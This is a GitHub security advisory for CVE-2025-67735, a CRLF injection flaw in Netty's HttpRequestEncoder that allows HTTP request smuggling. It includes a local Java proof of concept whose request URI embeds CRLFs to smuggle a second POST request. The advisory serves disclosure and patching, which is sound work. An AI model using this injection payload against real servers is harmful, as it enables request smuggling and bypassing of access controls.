# [M] Netty has a CRLF Injection vulnerability in io.netty.handler.codec.http.HttpRequestEncoder

## Summary
Severity: Medium
Advisory: GHSA-84h7-rjj3-6jx4
CVE: CVE-2025-67735
CWE: CWE-93
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2025-12-15
Source: https://github.com/advisories/GHSA-84h7-rjj3-6jx4
Type: github-advisory

## Affected
- Maven: `io.netty:netty-codec-http` — affected >=4.2.0.Alpha1 <4.2.8.Final
- Maven: `io.netty:netty-codec-http` — affected >=0 <4.1.129.Final

## Details
### Summary

The `io.netty.handler.codec.http.HttpRequestEncoder` CRLF injection with the request uri when constructing a request. This leads to request smuggling when `HttpRequestEncoder` is used without proper sanitization of the uri.

### Details

The `HttpRequestEncoder` simply UTF8 encodes the `uri` without sanitization (`buf.writeByte(SP).writeCharSequence(uriCharSequence, CharsetUtil.UTF_8);`)

The default implementation of HTTP headers guards against such possibility already with a validator making it impossible with headers.

### PoC

Simple reproducer:

```java
public static void main(String[] args) {

  EmbeddedChannel client = new EmbeddedChannel();
  client.pipeline().addLast(new HttpClientCodec());

  EmbeddedChannel server = new EmbeddedChannel();
  server.pipeline().addLast(new HttpServerCodec());
  server.pipeline().addLast(new ChannelInboundHandlerAdapter() {
    @Override
    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
      System.out.println("Processing msg " + msg);
    }
  });

  DefaultHttpRequest request = new DefaultHttpRequest(
    HttpVersion.HTTP_1_1,
    HttpMethod.GET,
    "/s1 HTTP/1.1\r\n" +
      "\r\n" +
      "POST /s2 HTTP/1.1\r\n" +
      "content-length: 11\r\n\r\n" +
      "Hello World" +
      "GET /s1"
  );
  client.writeAndFlush(request);
  ByteBuf tmp;
  while ((tmp = client.readOutbound()) != null) {
    server.writeInbound(tmp);
  }
}
```

### Impact

Any application / framework using `HttpRequestEncoder` can be subject to be abused to perform request smuggling using CRLF injection.

## References
- https://github.com/netty/netty/security/advisories/GHSA-84h7-rjj3-6jx4
- https://nvd.nist.gov/vuln/detail/CVE-2025-67735
- https://github.com/netty/netty/commit/77e81f1e5944d98b3acf887d3aa443b252752e94
- https://github.com/netty/netty
